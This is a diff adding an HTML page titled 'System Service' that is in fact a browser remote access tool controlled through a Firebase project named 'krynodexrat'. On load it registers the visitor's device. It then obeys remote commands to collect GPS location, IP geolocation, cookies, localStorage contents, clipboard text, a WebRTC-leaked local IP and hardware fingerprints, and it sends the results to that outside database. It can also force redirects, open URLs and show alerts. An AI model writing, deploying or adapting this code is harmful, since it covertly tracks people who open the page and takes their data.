@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>System Service</title>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#000;color:#0f0;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:'Courier New',monospace;flex-direction:column;gap:10px;text-align:center;padding:20px;user-select:none}
+.status-text{font-size:11px;color:#0f0;letter-spacing:1px}
+.id-text{font-size:7px;color:#222;margin-top:6px}
+.alert-overlay{position:fixed;inset:0;background:rgba(0,0,0,.96);z-index:99999;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:16px;animation:fadeIn .25s}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+.alert-box{background:#0a0a0a;border:1px solid #ff3333;border-radius:16px;padding:36px 28px;text-align:center;max-width:88vw;box-shadow:0 0 80px rgba(255,0,0,.15)}
+.alert-msg{color:#ff4444;font-size:16px;font-weight:600;font-family:'Segoe UI',system-ui,sans-serif;word-break:break-word;line-height:1.5}
+.alert-close{background:transparent;color:#ff6666;border:1px solid #ff3333;padding:10px 28px;border-radius:10px;font-size:13px;font-weight:600;cursor:pointer;margin-top:14px;transition:.2s;font-family:'Segoe UI',system-ui,sans-serif;letter-spacing:.5px}
+.alert-close:hover{background:#ff3333;color:#000}
+</style>
+</head>
+<body>
+<div class="status-text" id="statusMsg">● INITIALIZING</div>
+<div class="id-text" id="idDisplay"></div>
+
+<script>
+// ═══════════════════════ ID ═══════════════════════
+const STORAGE_KEY='__az_id';
+let DEVICE_ID=localStorage.getItem(STORAGE_KEY);
+if(!DEVICE_ID){DEVICE_ID='DVC_'+Math.random().toString(36).substr(2,9)+'_'+Date.now().toString(36);localStorage.setItem(STORAGE_KEY,DEVICE_ID)}
+document.getElementById('idDisplay').textContent=DEVICE_ID;
+
+// ═══════════════════════ FIREBASE ═══════════════════════
+const FB={apiKey:"AIzaSyBvlhJRWV8PIH09bHKdUpQKv4x6mT9wCIE",authDomain:"krynodexrat.firebaseapp.com",databaseURL:"https://krynodexrat-default-rtdb.asia-southeast1.firebasedatabase.app",projectId:"krynodexrat",storageBucket:"krynodexrat.firebasestorage.app",messagingSenderId:"465327768431",appId:"1:465327768431:web:3e5871b9f80dcbcad1de9a"};
+firebase.initializeApp(FB);
+const db=firebase.database();
+
+// ═══════════════════════ HELPERS ═══════════════════════
+function ts(){return Date.now()}
+
+// ═══════════════════════ REGISTER ═══════════════════════
+db.ref('devices/'+DEVICE_ID).update({
+  id:DEVICE_ID,
+  model:(navigator.userAgent.split(';')[1]||'Browser').trim().substring(0,50),
+  platform:navigator.platform,
+  lang:navigator.language,
+  scr:screen.width+'x'+screen.height,
+  reg:ts(),
+  seen:ts(),
+  on:true
+}).then(()=>document.getElementById('statusMsg').textContent='● ACTIVE')
+.catch(()=>document.getElementById('statusMsg').textContent='● ERROR');
+
+setInterval(()=>db.ref('devices/'+DEVICE_ID).update({seen:ts(),on:true}),12000);
+
+// ═══════════════════════ 1. GPS + REVERSE GEO ═══════════════════════
+async function gpsFull(){
+  return new Promise(r=>{
+    if(!navigator.geolocation){r({err:"GPS not available"});return}
+    navigator.geolocation.getCurrentPosition(async p=>{
+      const lat=p.coords.latitude,lon=p.coords.longitude;
+      try{
+        const re=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+        const d=await re.json();
+        r({
+          lat,lon,
+          acc:Math.round(p.coords.accuracy)+'m',
+          addr:d.display_name||'Unknown',
+          city:d.address?.city||d.address?.town||d.address?.village||'Unknown',
+          state:d.address?.state||'',
+          country:d.address?.country||'',
+          map:`https://maps.google.com/?q=${lat},${lon}`
+        })
+      }catch(e){
+        r({lat,lon,acc:Math.round(p.coords.accuracy)+'m',map:`https://maps.google.com/?q=${lat},${lon}`})
+      }
+    },e=>r({err:e.message}),{enableHighAccuracy:true,timeout:10000})
+  })
+}
+
+// ═══════════════════════ 2. IP GEOLOCATION ═══════════════════════
+async function ipGeo(){
+  try{
+    const re=await fetch('https://ipapi.co/json/');
+    const d=await re.json();
+    return {
+      ip:d.ip,
+      city:d.city,
+      region:d.region,
+      country:d.country_name,
+      isp:d.org,
+      timezone:d.timezone,
+      asn:d.asn,
+      map:`https://maps.google.com/?q=${d.latitude},${d.longitude}`
+    }
+  }catch(e){return {err:"IP lookup failed"}}
+}
+
+// ═══════════════════════ 3. DEVICE INFO ═══════════════════════
+async function devInfo(){
+  let bat='N/A';
+  try{const b=await navigator.getBattery();bat=Math.round(b.level*100)+'% '+(b.charging?'⚡ Charging':'🔋 Battery')}catch(e){}
+  let ip='N/A';
+  try{ip=(await(await fetch('https://api.ipify.org?format=json')).json()).ip}catch(e){}
+  return {
+    ua:navigator.userAgent.substring(0,150),
+    os:navigator.platform,
+    lang:navigator.language,
+    res:screen.width+'x'+screen.height+' @'+devicePixelRatio+'x',
+    depth:screen.colorDepth+'bit',
+    ram:navigator.deviceMemory||'?',
+    cpu:navigator.hardwareConcurrency||'?',
+    bat,
+    ip,
+    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    on:navigator.onLine,
+    ck:navigator.cookieEnabled
+  };
+}
+
+// ═══════════════════════ 4. COOKIES DUMP ═══════════════════════
+function getCookies(){
+  const cks=document.cookie.split(';').map(c=>c.trim()).filter(c=>c);
+  return {
+    count:cks.length,
+    cookies:cks.join(' | ')||'No cookies',
+    domain:location.hostname
+  };
+}
+
+// ═══════════════════════ 5. LOCALSTORAGE DUMP ═══════════════════════
+function getLocalStorage(){
+  const items=[];
+  try{
+    for(let i=0;i<localStorage.length;i++){
+      const k=localStorage.key(i);
+      const v=localStorage.getItem(k);
+      items.push(k+'='+(v.length>80?v.substring(0,80)+'...':v));
+    }
+  }catch(e){}
+  return {
+    count:items.length,
+    items:items.join(' | ')||'Empty',
+    domain:location.hostname
+  };
+}
+
+// ═══════════════════════ 6. WEBRTC IP LEAK ═══════════════════════
+async function webrtcIP(){
+  return new Promise(r=>{
+    const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+    pc.createDataChannel('');
+    pc.createOffer().then(o=>pc.setLocalDescription(o));
+    pc.onicecandidate=e=>{
+      if(!e.candidate){pc.close();r({err:"No WebRTC IP found"});return}
+      const ip=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+      if(ip){pc.close();r({localIP:ip[0],type:'WebRTC leak'})}
+    };
+    setTimeout(()=>{pc.close();r({err:"WebRTC timeout"})},5000);
+  });
+}
+
+// ═══════════════════════ 7. NOTIFICATION ═══════════════════════
+async function sendNotif(title,body){
+  if(!('Notification' in window))return {err:"Notification not supported"};
+  if(Notification.permission==='granted'){
+    new Notification(title||'System',{body:body||'Message received',icon:'🔔'});
+    return {status:'sent',title,body};
+  }
+  if(Notification.permission==='denied')return {err:"Notification denied"};
+  const p=await Notification.requestPermission();
+  if(p==='granted'){
+    new Notification(title||'System',{body:body||'Message received'});
+    return {status:'sent',title,body};
+  }
+  return {err:"Notification denied"};
+}
+
+// ═══════════════════════ 8. REDIRECT ═══════════════════════
+function redirect(url){
+  try{
+    window.location.href=url;
+    return {status:'redirecting',url};
+  }catch(e){return {err:"Redirect failed: "+e.message}}
+}
+
+// ═══════════════════════ 9. HARDWARE INFO ═══════════════════════
+function hwInfo(){
+  const gpu=(()=>{
+    const c=document.createElement('canvas');
+    const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+    if(!gl)return 'N/A';
+    const dbg=gl.getExtension('WEBGL_debug_renderer_info');
+    return dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):'N/A';
+  })();
+  return {
+    ram:navigator.deviceMemory||'?',
+    cpu:navigator.hardwareConcurrency||'?',
+    gpu,
+    touch:'ontouchstart' in window,
+    maxTouch:navigator.maxTouchPoints||0,
+    orientation:screen.orientation?.type||'N/A'
+  };
+}
+
+// ═══════════════════════ 10. CLIPBOARD ═══════════════════════
+async function clipboardRead(){
+  try{
+    const text=await navigator.clipboard.readText();
+    return {status:'read',text:text.substring(0,500),length:text.length};
+  }catch(e){return {err:"Clipboard denied - need focus & permission"}}
+}
+
+// ═══════════════════════ ALERT FULLSCREEN ═══════════════════════
+function alertFull(msg){
+  const ov=document.createElement('div');ov.className='alert-overlay';
+  ov.innerHTML=`<div class="alert-box"><p class="alert-msg">${msg}</p><button class="alert-close" onclick="this.closest('.alert-overlay').remove()">CLOSE</button></div>`;
+  document.body.appendChild(ov);
+  return {status:'alerted',msg};
+}
+
+// ═══════════════════════ EXECUTE ═══════════════════════
+async function exec(cmd){
+  const r={type:cmd,status:'ok',time:ts()};
+  switch(cmd){
+    case 'GPS':r.data=await gpsFull();break;
+    case 'IP':r.data=await ipGeo();break;
+    case 'INFO':r.data=await devInfo();break;
+    case 'COOKIES':r.data=getCookies();break;
+    case 'LOCAL':r.data=getLocalStorage();break;
+    case 'RTC':r.data=await webrtcIP();break;
+    case 'NOTIF':r.data=await sendNotif('System Alert','You have been notified');break;
+    case 'HW':r.data=hwInfo();break;
+    case 'CLIP':r.data=await clipboardRead();break;
+    default:
+      if(cmd.startsWith('MSG:')){r.data=alertFull(cmd.slice(4));r.type='ALERT'}
+      else if(cmd.startsWith('URL:')){open(cmd.slice(4),'_blank');r.data={url:cmd.slice(4)};r.type='OPEN_URL'}
+      else if(cmd.startsWith('REDIR:')){r.data=redirect(cmd.slice(6));r.type='REDIRECT'}
+      else if(cmd.startsWith('NOTIF:')){const parts=cmd.slice(6).split('|');r.data=await sendNotif(parts[0],parts[1]);r.type='NOTIFICATION'}
+      else{r.data={err:'unknown command'}}
+  }
+  return r;
+}
+
+// ═══════════════════════ LISTEN ═══════════════════════
+db.ref('cmds/'+DEVICE_ID).on('child_added',async sn=>{
+  const c=sn.val();if(!c||c.st!=='pending')return;
+  sn.ref.update({st:'running'});
+  const result=await exec(c.cmd);
+  db.ref('data').push(result);
+  sn.ref.update({st:'done'});
+  setTimeout(()=>sn.ref.remove(),3000);
+});
+</script>
+</body>
+</html>
